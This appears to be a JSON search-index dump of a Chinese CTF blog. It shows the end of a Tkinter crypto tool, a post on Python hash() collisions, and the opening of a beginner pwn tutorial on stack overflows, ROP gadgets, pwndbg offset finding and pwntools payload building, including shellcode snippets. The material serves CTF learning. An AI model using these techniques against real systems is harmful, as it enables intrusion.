row.pack(anchor=&#x27;w&#x27;, padx=40, pady=3)# 计算按钮button_frame = tk.Frame(rsa_crack_frame)tk.Button(button_frame, text=&#x27;破解&#x27;, font=font_title, bg=&#x27;#FF9800&#x27;, fg=&#x27;white&#x27;, command=rsa_crack_handler).pack(side=tk.LEFT, padx=(0, 10))tk.Button(button_frame, text=&#x27;重置&#x27;, font=font_title, bg=&#x27;#607D8B&#x27;, fg=&#x27;white&#x27;, command=lambda: reset_rsa_entries()).pack(side=tk.LEFT)button_frame.pack(pady=10)tk.Label(rsa_crack_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()rsa_crack_output = scrolledtext.ScrolledText(rsa_crack_frame, height=12, font=font_text)rsa_crack_output.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 哈希 - SHA256 界面 ------------------def compute_sha256(): sha256_output_text.delete(&#x27;1.0&#x27;, tk.END) raw = sha256_input_text.get(&#x27;1.0&#x27;, tk.END).strip() if not raw: sha256_output_text.insert(tk.END, &quot;请输入文本内容。&quot;) return h = hashlib.sha256(raw.encode()).hexdigest() sha256_output_text.insert(tk.END, h)sha256_frame = tk.Frame(root)# 布局tk.Label(sha256_frame, text=&#x27;请输入文本内容：&#x27;, font=font_title).pack(pady=(10,0))sha256_input_text = scrolledtext.ScrolledText(sha256_frame, height=6, font=font_text)sha256_input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(sha256_frame, text=&#x27;计算哈希&#x27;, font=font_title, bg=&#x27;#E91E63&#x27;, fg=&#x27;white&#x27;, command=compute_sha256).pack(pady=10)tk.Label(sha256_frame, text=&#x27;SHA256 结果：&#x27;, font=font_title).pack()sha256_output_text = scrolledtext.ScrolledText(sha256_frame, height=6, font=font_text)sha256_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 哈希 - MD5 界面 ------------------def compute_md5(): md5_output_text.delete(&#x27;1.0&#x27;, tk.END) raw = md5_input_text.get(&#x27;1.0&#x27;, tk.END).strip() if not raw: md5_output_text.insert(tk.END, &quot;请输入文本内容。&quot;) return h = hashlib.md5(raw.encode()).hexdigest() md5_output_text.insert(tk.END, h)md5_frame = tk.Frame(root)# 布局tk.Label(md5_frame, text=&#x27;请输入文本内容：&#x27;, font=font_title).pack(pady=(10,0))md5_input_text = scrolledtext.ScrolledText(md5_frame, height=6, font=font_text)md5_input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(md5_frame, text=&#x27;计算哈希&#x27;, font=font_title, bg=&#x27;#7E57C2&#x27;, fg=&#x27;white&#x27;, command=compute_md5).pack(pady=10)tk.Label(md5_frame, text=&#x27;MD5 结果：&#x27;, font=font_title).pack()md5_output_text = scrolledtext.ScrolledText(md5_frame, height=6, font=font_text)md5_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 菜单配置 ------------------encoding_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;编码&#x27;, menu=encoding_menu)encoding_menu.add_command(label=&#x27;编码&#x27;, command=lambda: show_frame(encode_frame))encoding_menu.add_command(label=&#x27;解码&#x27;, command=lambda: show_frame(decode_frame))classical_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;古典密码&#x27;, menu=classical_menu)classical_menu.add_command(label=&#x27;栅栏密码&#x27;, command=lambda: show_frame(RailFence_frame))classical_menu.add_command(label=&#x27;凯撒密码&#x27;, command=lambda: show_frame(Caesar_frame))classical_menu.add_command(label=&#x27;维吉尼亚密码&#x27;, command=lambda: show_frame(Vigenere_frame))rsa_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;RSA&#x27;, menu=rsa_menu)pem_menu = tk.Menu(rsa_menu, tearoff=0)rsa_menu.add_cascade(label=&#x27;PEM&#x27;, menu=pem_menu)pem_menu.add_command(label=&#x27;生成PEM&#x27;, command=lambda: show_frame(rsa_generate_pem_frame))pem_menu.add_command(label=&#x27;解析PEM&#x27;, command=lambda: show_frame(rsa_pem_frame))rsa_menu.add_command(label=&#x27;破解 RSA&#x27;, command=lambda: show_frame(rsa_crack_frame))hash_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;哈希&#x27;, menu=hash_menu)hash_menu.add_command(label=&#x27;SHA256&#x27;, command=lambda: show_frame(sha256_frame))hash_menu.add_command(label=&#x27;MD5&#x27;, command=lambda: show_frame(md5_frame))# 默认显示页面show_frame(decode_frame)root.mainloop() 打包可以用pyinstaller将这个程序打包成.exe软件。 如果没有安装，则运行： 1pip install pyinstaller 安装好后运行（先将当前python脚本保存为CryptexLab.py）： 1pyinstaller --noconfirm --windowed --onefile .\\CryptexLab.py CryptexLab.exe文件应该会生成在当前目录下的： 1dist/decoder.exe","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"tool","slug":"tool","permalink":"https://archer-baiyi.github.io/en/tags/tool/"}]},{"title":"Python内置的哈希函数的碰撞","slug":"CTF/Crypto/Python内置的哈希函数的漏洞","date":"2025-05-17T17:40:40.000Z","updated":"2025-05-20T18:27:53.151Z","comments":true,"path":"2025/05/17/CTF/Crypto/Python内置的哈希函数的漏洞/","permalink":"https://archer-baiyi.github.io/en/2025/05/17/CTF/Crypto/Python%E5%86%85%E7%BD%AE%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E/","excerpt":"Python内置的哈希函数 hash() 的碰撞漏洞","text":"hash()Python拥有一个内置的哈希函数hash()，可以在Python 标准库文档找到对应的解释： （来源：https://docs.python.org/3/library/stdtypes.html#hashing-of-numeric-types） 也就是说，在32位的平台上哈希是通过 \\text{hash}(x) = x \\text{ mod } 2^{31}-1计算出来的。而在64位的平台上，是通过 \\text{hash}(x) = x \\text{ mod } 2^{61}-1碰撞（Collision）这个哈希函数的构造意味着我们可以非常轻松地找到一个哈希碰撞（Collision），因为它两种resistance（Weak and strong collision resistance）都不满足。 假设现在给定一个整数$x$。 如果是在32位的平台上，则可以通过以下公式计算出一个$y$使得$\\text{hash}(x)=\\text{hash}(y)$ y:= x+2^{31}-1如果是在64位的平台上，则 y:= x+2^{61}-1。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/en/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/en/tags/Hash/"},{"name":"python","slug":"python","permalink":"https://archer-baiyi.github.io/en/tags/python/"}]},{"title":"CTF Pwn 入门","slug":"CTF/Pwn/Pwn入门","date":"2025-05-12T15:01:08.000Z","updated":"2026-02-06T23:43:56.842Z","comments":true,"path":"2025/05/12/CTF/Pwn/Pwn入门/","permalink":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/","excerpt":"零基础Pwn入门","text":"本篇文章主要介绍x86-64架构的64位程序下的pwn漏洞以及利用思路。 （很多背景知识，安全性检查以及介绍工具功能的内容可能一开始完全看不懂，但是可以不用太在意。先知道有这么个东西，在后面看到需要相关知识/命令的时候再回来看就好。） 背景知识地址空间（Address space，Prozess Adressraum）地址空间可以被看作是一个巨大的 一维字节数组，在程序运行时（与它潜在的大小相比），其中只有少数位置存有数据。由于地址空间占用非常稀疏，操作系统会将其划分为大小相等的 页（Pages），其中只有被操作系统释放（映射）的页才可以被访问。 程序从硬盘被加载到低地址空间（对应的页由操作系统或程序加载器自动提供）。 用于执行的机器代码存放在 文本段（Text Segment） 中，静态初始化的变量和字符串常量存放在 数据段（Data Segment） 中。静态变量如果在程序开始时尚未被赋值，则会放在 BSS 段 中，并由操作系统填充为零字节。 程序所需的动态链接库也由这三类段组成，并由程序加载器加载到更高的内存地址。由于这些库所需的内存是通过 mmap 系统调用 向操作系统申请的，因此它们也被称为 MMap 段。 在程序初始化过程中，还会额外保留两个区域： 栈（Stack）：用于自动管理的变量。 堆（Heap）：用于动态分配的变量。 栈在每次函数调用时会扩展一个 栈帧（Stack Frame）。在栈帧的内存区域中存储有当前函数的局部变量，以及一些管理信息，例如 返回地址。返回地址记录了当前执行的函数是从哪一个程序地址被调用的。随着函数调用深度的增加，栈会从高地址向低地址方向增长。 当需要在函数执行完毕后变量仍然存在时，就必须使用堆来进行动态内存分配（因为栈上的变量会在函数返回时自动释放）。在这种情况下，程序可以通过libc 提供的分配器使用malloc函数向系统申请内存。如果可能，分配器会返回对程序启动时预留的堆区域的引用；如果堆空间不足，分配器会通过 mmap 系统调用 向操作系统请求一个新的 MMap 段，并返回对该段的引用。 C 标准库（libc）除了包含内存分配器之外，还提供了许多常用函数，以便简化与操作系统的交互。 代码（文本段）是静止的，但动态库（libc）的地址每次运行时可能都会变（ASLR），或者在程序写好时根本不知道它在哪里。那程序是如何找到printf或system的真实地址的呢？ 这个时候就需要PLT和GOT了： PLT (Procedure Linkage Table - 过程链接表)： 存放在.plt 段（类似于文本段，是只读、可执行的代码）。 指向GOT（记录的函数的GOT地址） GOT (Global Offset Table - 全局偏移表)： 存放在.got.plt 段（属于数据段的一部分，是可读、可写的数据）。 初始时指向PLT，解析后指向libc Linux 为了启动速度，默认不会一开始就把所有函数的地址都填好，而是真正用到的时候才去找实际地址。这个过程叫延迟绑定。 延迟绑定主要分为2种过程： 过程一：首次调用（符号解析阶段） 当程序第一次尝试调用共享库中的函数（如 printf）时，由于地址尚未解析，执行流程如下： 调用 PLT 存根 (Call PLT Stub) 程序 .text 段执行 call printf@plt 指令，将控制流转移至 .plt 段中对应的 printf 存根代码。 间接跳转 (Indirect Jump) PLT 存根执行第一条指令 jmp *printf@GOT。这是一条间接跳转指令，目标地址从全局偏移表（.got.plt）的对应条目中读取。 回落至 PLT (Fallthrough) 在初始化状态下，.got.plt 中存储的地址并非函数的真实地址，而是 PLT 存根中下一条指令的地址（即紧随上述 jmp 指令之后的地址）。因此，执行流并未跳转至外部，而是继续执行 PLT 存根中的剩余代码。 准备重定位参数 (Prepare Relocation) PLT 存根将该符号在重定位表中的索引（Relocation Index）压入栈中，随后跳转至 PLT 的公共头部（PLT[0]）。 调用动态链接器 (Invoke Dynamic Linker) PLT[0] 将链接映射结构（link_map）压入栈，并调用动态链接器的解析函数（通常为 _dl_runtime_resolve）。 符号解析与地址回填 (Resolution &amp; Patching) _dl_runtime_resolve 遍历依赖库的导出符号表，查找 printf 的实际虚拟地址（例如 0x7ffff7a0d123）。找到后，它执行两个操作： 执行函数：调用目标函数。 更新 GOT：将查找到的真实地址写入 .got.plt 中对应的条目，覆盖原有的回落地址。 过程二：后续调用（直接执行阶段） 当程序再次执行 call printf@plt 时，由于 GOT 表项已被更新，流程简化如下： 调用 PLT 存根 (Call PLT Stub) 程序再次执行 call printf@plt，跳转至 .plt 段。 间接跳转至目标 (Direct Redirection) PLT 存根再次执行 jmp *printf@GOT。此时，系统从 .got.plt 中读取到的已是 printf 的真实地址（0x7ffff7a0d123）。 控制流转移 (Control Transfer) CPU 直接跳转至共享库中的 printf 函数入口执行，不再触发动态链接器的解析过程。 更详细的地址空间结构图示： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273高地址 (High Address) (通常是 0x7fffffffffff) |+---------------------------+| Kernel Space | (内核空间 - 用户态无法直接访问)+---------------------------+| Command Line Args | (argv pointers)| Environment Vars | (envp pointers)+---------------------------+ &lt;--- [Stack Base / 栈底]| || Stack | (栈)| (Grows Down) | 用于局部变量、函数参数、返回地址| | || v |+---------------------------+ &lt;--- [RSP / 栈顶]| || (Random Gap) | (随机偏移，用于 ASLR)| |+---------------------------+| || Memory Mapping Segment | &lt;--- [MMap 段]| (Shared Libraries) | 动态链接库 (libc.so, ld-linux.so)| | | +-------------------+ || | libc.so .text | || | (printf的真实位置) | || +-------------------+ || |+---------------------------+| || (Random Gap) || |+---------------------------+| ^ || | || Heap | (堆)| (Grows Up) | 用于 malloc/new 分配的内存| |+---------------------------+ &lt;--- [Heap Base]| || .bss Segment | (未初始化数据段)| (Block Started by Symbol)| 全局变量 int global_var; (默认 0)| |+---------------------------+| || .data Segment | (已初始化数据段)| | 全局变量 int flag = 1;| |+---------------------------+| || .got.plt Section | &lt;--- [GOT 表] (Data Segment的一部分)| (Global Offset Table) || || || |+---------------------------+| || .plt Section | &lt;--- [PLT 表] (Text Segment的一部分)| (Procedure Linkage Table)|| |+---------------------------+| || .text Segment | &lt;--- [代码段] | (Binary Code) || | main 函数在这里| |+---------------------------+| || Read-Only Data | (.rodata) 字符串常量，比如说&quot;Hello World&quot;+---------------------------+ | | (0x00400000 左右，如果是 PIE 则随机) | 低地址 (Low Address) (0x000000000000) 如果开启了ASLR（下面会讲），那么Stack Base (栈基址)、MMap Base (映射区基址)、Heap Base (堆基址)在每次程序运行的时候都是随机的地址。 在程序执行过程中，如果访问了一个无效的地址（即未映射的页），操作系统会向程序发送一个 段错误（Segmentation Fault） 信号。如果程序没有对此进行处理，就会导致程序终止。 X86汇编因为汇编设计的内容太多了，这里没法全都讲，所以大家自己找点其他的资料学一学。 但是并不是说不懂汇编就完全没法做和理解pwn题，所以也可以边学pwn边学汇编，这样有实际例子的情况下也可用更好更高效地掌握汇编。 下面主要提一些比较重要的点： Linux x64(System V AMD64 ABI)传参顺序： RDI (第 1 参数)。 RSI (第 2 参数) RDX (第 3 参数) RCX (第 4 参数) R8 (第 5 参数) R9 (第 6 参数) 后续的参数会被存在栈上 其他的常用寄存器： RIP (Instruction Pointer) 定义：指向下一条要执行的指令地址。 PWN意义：当函数执行ret时，CPU 会把那个地址弹给 RIP。 RSP (Stack Pointer) 定义：永远指向栈顶。 PWN意义：push和pop都会自动修改它。 RBP (Base Pointer) 定义：栈帧的基址（底）。 PWN意义：主要用于定位局部变量。配合leave; ret可以实现栈迁移。 RAX (Accumulator) 常规用途：算术运算结果、函数的返回值。 PWN核心用途 (Syscall)： 在做ret2Syscall/SROP（利用系统调用拿 shell）时，RAX决定了要呼叫内核做什么。 RAX = 59 (0x3b) -&gt; 对应 execve 系统调用（运行程序）。 RAX = 0 -&gt; read RAX = 1 -&gt; write RAX = 15 -&gt; rt_sigreturn 特殊段寄存器：FS (Segment Register) PWN意义：在64位Linux下，Canary的值总是存在fs:[0x28]这个位置。 GadgetGadget是指由于代码复用攻击（Code Reuse Attack）需求，而在现有的可执行内存段（如 .text 段或共享库）中被分离出来的、以控制流转移指令（Control Transfer Instruction）结尾的一段机器指令序列。 最常见的形式是ROP Gadget（Return-Oriented Programming Gadget），其结尾指令严格为ret (Return)。 一个标准的 Gadget 由两部分组成： 操作指令序列 (Operational Instructions)：执行实际的计算、数据传输或逻辑运算（如 pop, mov, add, xor）。 终结指令 (Terminator)：用于将控制权交还给攻击者控制的机制。在 ROP 中，这是 ret 指令。 执行原语： Gadget 并不像正常函数那样通过 call 调用，而是通过栈指针（RSP/ESP）作为伪指令指针来驱动。 ret 的本质：pop rip。它从栈顶弹出一个值赋给 RIP（指令指针）。 攻击者在栈上预先布置好一连串的地址（ROP Chain）。 每一个 Gadget 执行完其逻辑后，执行 ret，这会导致 CPU 从栈上读取下一个 Gadget 的地址并跳转执行。 这种机制使得 RSP 实际上替代了 RIP 的角色，而栈上的数据流变成了指令流。 常用的gadget： pop rdi ; ret、pop rsi ; ret、pop rdx ; ret：设置函数的参数 pop rbp：把栈顶的8字节弹到寄存器 rbp，同时 rsp += 8。 安全性检查我们可以使用checksec命令检查一份二进制文件的安全性. 安装： 1sudo apt install checksec 例子： 123456789└─$ checksec ./vuln Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes 12345678└─$ checksec ./racecar Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Stripped: No 1234567891011└─$ checksec vuln Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments Stripped: No Debuginfo: Yes 12345678└─$ checksec vuln Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No 解释： Arch：二进制文件的架构 amd64-64-little： x86-64架构的64位小端序ELF可执行文件； i386-32-little：x86架构的32位小端序ELF可执行文件 NX：Non-eXecutable，表示数据段不可执行。 disabled / Stack: Executable：可以直接在栈/堆执行shellcode； enabled：栈和堆不能直接执行代码。 PIE：Position Independent Executable，表示主程序不依赖于固定的绝对内存地址，而是能够被加载到任意基址，即main、.text、.data、.bss等的运行时实际地址会变成基址+绝对内存地址（base_addr + offset）的形式。在系统开启 ASLR 时，每次运行主程序会选择不同的基址。 No PIE：程序总是加载在固定的绝对内存地址； 也就是说我们用工具读取到的如.bss的地址和程序实际运行时.bss的地址是有一样的。 PIE enabled：主程序基址随机化。 我们用工具读取到的如.bss的地址和程序实际运行时.bss的地址是有不一样的，实际地址会等于我们读取到的地址加上一个随机的基址base_addr。 RELRO：Read-Only Relocations，程序启动时完成必要的重定位后，把用于重定位相关的数据区（尤其是 GOT 等）所在的内存页改成只读。 Full RELRO：.got, .got.plt完全只读； Partial RELRO：只部分保护，.got只读，但.got.plt仍可以修改； No RELRO：完全没有保护，.got, .got.plt均可修改。 Stack：是否启用了栈金丝雀（Stack Canary）：一种用于检测栈缓冲区溢出的运行时保护机制。编译器在函数的栈帧中、局部变量与返回地址之间插入一个随机（或带固定格式）的“金丝雀值”；函数返回前会检查该值是否被改写。若发生变化，说明栈上出现了越界写（很可能覆盖到返回地址），程序会立即终止或触发安全处理。 No canary found：没有栈金丝雀； Canary found：设置了栈金丝雀。 Stripped：是否剥离了符号信息。 No：包含函数名、符号，方便调试和逆向分析； Yes：已剥离，更难逆向，但对运行安全性影响不大。 Debuginfo：是否带有调试信息（DWARF 等）。 No：一般发布版本应去掉； Yes：含源码级调试信息，方便开发调试，但可能泄露过多信息。 除此之外，还有一个大部分机器/题目环境默认开启的保护措施：ASLR（Address Space Layout Randomization，地址空间布局随机化）。 这一种由操作系统实现的内存保护机制。在程序每次启动时，操作系统会把进程地址空间中的关键区域的基址随机化（例如栈、堆、共享库映射区（其中包括libc）、vdso 等），使代码和数据的实际地址在不同运行之间不可预测。 工具了解一下常用的基础工具，可以先安装好，但是具体操作可以先不用管，了解了后面的漏洞以及利用方法之后再回来看/查找命令即可。 GDBGDB（GNU Debugger）是 GNU 项目的调试器，主要用于调试 C/C++ 等程序。 安装1sudo apt install gdb 安装Pwndbgpwndbg 是 GDB 的调试插件，提供栈/堆/寄存器上下文展示以及 cyclic、rop、heap、format 等命令，用于更高效地调试二进制漏洞。 安装： 12345678910# 1) 依赖sudo apt updatesudo apt install -y git python3-venv python3-pip# 2) 拉仓库到你用户目录git clone https://github.com/pwndbg/pwndbg ~/.local/share/pwndbgcd ~/.local/share/pwndbg# 3) 运行安装脚本（会给你创建一个本地 venv，并把 source 写入 ~/.gdbinit）./setup.sh 安装前： 安装后： 常用命令1. 使用GDB打开二进制文件 123gdb ./vuln#或者gdb -q ./vuln -q：quiet，安静模式，不显示启动欢迎信息。 或者是先普通打开gdb，然后再选择文件： 123gdbpwndbg&gt; file ./pwn 2. 运行程序 1234runrun &lt; input.txt # 用文件输入run &lt;&lt;&lt; &quot;AAAA&quot; # 简单输入 3. 查看汇编代码 1234disassemble maindisass maindisassemble win 4. 设置断点 12break main # 在 main 函数处断点b main 5. 查看寄存器 1234info registersi rx/20gx $rsp # 查看栈内容（20 个 8 字节，从 RSP 开始） 6. 搜索gadgets 12345rop --grep &quot;ret&quot;rop --grep &quot;pop rdi ; ret&quot;rop --grep &quot;pop rsi ; pop r15 ; ret&quot; 确定返回地址偏移123456pwndbg&gt; | cyclic 1200 | tee /tmp/pat &gt; /dev/nullpwndbg&gt; run &lt; /tmp/pat# 程序崩溃后：pwndbg&gt; x/gx $rsp # 记下这里的 8 字节pwndbg&gt; cyclic -n 8 -o 0x... # 用上一步读到的值求偏移 | cyclic 1200 | tee /tmp/pat &gt; /dev/null：生成模式串并保存到文件 cyclic 1200：让 pwndbg 生成长度为 1200 字节的 De Bruijn 模式串（也叫“花指纹/模式串”）。它的特性是：任意连续的 n 字节子串在整段里唯一（默认 n=4）。长这样： 12pwndbg&gt; | cyclic 200 | tee /tmp/pataaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa tee /tmp/pat：写入文件 /tmp/pat。 &gt; /dev/null：隐藏输出。 x/gx $rsp：读取“将要被 ret 弹到 RIP”的 8 字节 x（examine）：查看内存。 /gx：一次显示 1 个 8 字节（g=8 bytes，“giant word”）并用 十六进制（x）格式。 $rsp：取 RSP 寄存器 作为要查看的内存地址。 cyclic -n 8 -o 0x...：用得到的返回地址反推偏移 -o（offset）：告诉 cyclic “这就是我在栈上读到的那 8 个字节”，请帮我算“它在刚才那段模式串里的起始位置（偏移）”。 -n 8：在 64 位上我们读的是 8 字节（gx），要用 8 字节粒度的唯一性去匹配；否则默认 n=4 可能匹配失败或给错结果。 0x...：把上一步 x/gx $rsp 看到的 十六进制数原样填进来。 输出：一个十进制数字，比如 Found at offset 18 —— 这就是覆盖到返回地址的偏移（字节数）。 例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778pwndbg&gt; | cyclic 1200 | tee /tmp/pat &gt; /dev/nullpwndbg&gt; run &lt; /tmp/patStarting program: /home/archer/ctf-kali/pwn/pwn38/pwn &lt; /tmp/pat[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;. ▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄ ██▀▀▀▀█ ▀▀▀██▀▀▀ ██▀▀▀▀▀▀ ██ ██▀ ██ ██ ▄▄█████▄ ██▄████▄ ▄████▄ ██ ██ ██ ██ ███████ ██▄▄▄▄ ▀ ██▀ ██ ██▀ ▀██ ▀█ ██ █▀ ██▄ ██ ██ ▀▀▀▀██▄ ██ ██ ██ ██ ██▄██▄██ ██▄▄▄▄█ ██ ██ █▄▄▄▄▄██ ██ ██ ▀██▄▄██▀ ▀██ ██▀ ▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀ ▀▀ ▀▀ * ************************************* * Classify: CTFshow --- PWN --- 入门 * Type : Stack_Overflow * Site : https://ctf.show/ * Hint : It has system and &#x27;/bin/sh&#x27;.There is a backdoor function * *************************************Just easy ret2text&amp;&amp;64bitProgram received signal SIGSEGV, Segmentation fault.0x0000000000400656 in ctfshow ()LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────── RAX 0x32 RBX 0x7fffffffd998 —▸ 0x7fffffffdc8e ◂— &#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27; RCX 0x400d3f ◂— jne 0x400db5 /* &#x27;Just easy ret2text&amp;&amp;64bit&#x27; */ RDX 0x32 RDI 0 RSI 0x7fffffffd866 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;) R8 0 R9 0 R10 0 R11 0x202 R12 0 R13 0x7fffffffd9a8 —▸ 0x7fffffffdcb2 ◂— &#x27;SHELL=/bin/bash&#x27; R14 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0 R15 0 RBP 0x6163616161616161 (&#x27;aaaaaaca&#x27;) RSP 0x7fffffffd878 ◂— 0x6164616161616161 (&#x27;aaaaaada&#x27;) RIP 0x400656 (ctfshow+31) ◂— ret──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────── ► 0x400656 &lt;ctfshow+31&gt; ret &lt;0x6164616161616161&gt; ↓───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────00:0000│ rsp 0x7fffffffd878 ◂— 0x6164616161616161 (&#x27;aaaaaada&#x27;)01:0008│ 0x7fffffffd880 ◂— 0x6165616161616161 (&#x27;aaaaaaea&#x27;)02:0010│ 0x7fffffffd888 ◂— 0x6166616161616161 (&#x27;aaaaaafa&#x27;)03:0018│ 0x7fffffffd890 ◂— 0x6167616161616161 (&#x27;aaaaaaga&#x27;)04:0020│ 0x7fffffffd898 —▸ 0x40066e (main) ◂— push rbp05:0028│ 0x7fffffffd8a0 ◂— 0x100400040 /* &#x27;@&#x27; */06:0030│ 0x7fffffffd8a8 —▸ 0x7fffffffd998 —▸ 0x7fffffffdc8e ◂— &#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27;07:0038│ 0x7fffffffd8b0 —▸ 0x7fffffffd998 —▸ 0x7fffffffdc8e ◂— &#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27;─────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────── ► 0 0x400656 ctfshow+31 1 0x6164616161616161 None 2 0x6165616161616161 None 3 0x6166616161616161 None 4 0x6167616161616161 None 5 0x40066e main 6 0x100400040 None 7 0x7fffffffd998 None────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; x/gx $rsp0x7fffffffd878: 0x6164616161616161pwndbg&gt; cyclic -n 8 -o 0x6164616161616161Finding cyclic pattern of 8 bytes: b&#x27;aaaaaada&#x27; (hex: 0x6161616161616461)Found at offset 18pwndbg&gt; 所以偏移为18。 IDA/Ghidra很多时候题目只会给编译好的二进制程序，并不会给源代码。这个时候就需要用软件进行反编译以便查看伪代码。这样就不用死磕纯汇编语言了。 下载： IDA免费版：https://hex-rays.com/ida-free IDA的Pro正式版收费非常贵。所以也可以考虑用完全免费开源的Ghidra。 Ghidra：https://ghidralite.com/ PwntoolsPwntools 是面向CTF/Pwn场景的Python库，提供连接服务、构造 payload、地址与数据的打包/解包、gadget 检索、shellcode 汇编以及 GDB 调试等功能，用于高效编写与调试利用代码（exploit）。 安装1pip3 install pwntools -U 常用 API（按任务分类）1) 连接与交互 （假设io=）process(path) / remote(host, port)：本地测试/远程连接 io.send(data) / io.sendline(data)：发送数据/行 io.recv(n) / io.recvline() / io.recvuntil(delim)：接收 io.sendafter(delim, data) / io.sendlineafter(delim, data)：等提示再发（菜单题常用） io.clean(timeout=0.1)：清空缓冲垃圾输出 io.interactive()：拿到交互式 shell，类似于nc。切换至这个模式时会自动print当前所有缓冲数据。 2) 打包/解包与快捷拼接 p32(x) / p64(x)，u32(b) / u64(b)：整型与字节序互转（小端） flat(*args, filler=b&#39;A&#39;, length=None)：会把传入的各类对象智能转换成一段字节串。它会根据 context（架构/字节序/位宽）自动处理对齐与打包。 例子： 123456789payload = flat(&#123; 0: shellcode, # shellcode 256: JMP_RSI_Adress&#125;)payload = flat(&#123; 0: b&quot;A&quot;*84, 84: win_Adress&#125;) fit(&#123;offset: data, ...&#125;, filler=b&#39;A&#39;)：按偏移放置数据 cyclic(n) / cyclic_find(value, n=4/8)：花指纹与偏移定位（也可用 pwndbg 的） 3) 程序信息与 ROP 工具 ELF(path)：读符号、plt/got、段地址等 elf.symbols[]：从符号表读取符号（函数/全局变量）的地址。返回 int。比如说： 1main = elf.symbols[&#x27;main&#x27;] # main 函数入口 elf.search()：在可执行文件已映射的各段中按字节序列搜索内容并返回一个生成器（迭代得到每个匹配的地址）。常配合 next(...) 取第一个匹配。。比如说 123elf.search(b&#x27;/bin/sh&#x27;) # 查找&#x27;/bin/sh&#x27;字符串pop_rdi = next(elf.search(asm(&#x27;pop rdi ; ret&#x27;))) # 查找&#x27;pop rdi ; ret&#x27;命令 elf.got[]：获取 GOT 表项地址（存放真实函数地址的指针位置）。返回 int（可写段；Full RELRO 下只读）。比如说 1got_puts = elf.got[&#x27;puts&#x27;] # 取 puts 的 GOT 表项地址（&amp;puts@GOT） elf.plt[&#39;puts&#39;]：获取 PLT 跳板（桩函数）的地址。返回 int。比如说： 1plt_puts = elf.plt[&#x27;puts&#x27;] # 调用 puts@plt，把某地址当作参数打印 ROP(elf)：自动搜 gadget/拼 ROP rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])，rop.call(&#39;puts&#39;, [addr])，rop.chain() context.binary = elf：让 pwntools 自动跟随架构 4) Shellcode / 汇编 asm(&#39;mov rax, 60; xor rdi, rdi; syscall&#39;)：将汇编转为机器码 shellcraft.sh() / asm(shellcraft.sh())： /bin/sh的Shellcode。 disasm(b&#39;\\x90\\x90\\xcc&#39;)：反汇编字节流 5) 调试辅助 gdb.attach(io, gdbscript=&#39;b *0x401234\\nc&#39;)：本地挂 gdb gdb.debug([path], gdbscript=...)：由 gdb 启动进程（便于断点） 6) 杂项 hexdump(data)：十六进制打印 log.info()/success()/warning()：美化日志 context.timeout = 2：全局超时 pause()：脚本暂停，手动操作后继续 模板 process用于本地测试，地址给二进制文件的地址； remote用于连接服务器。 123456789101112131415161718from pwn import 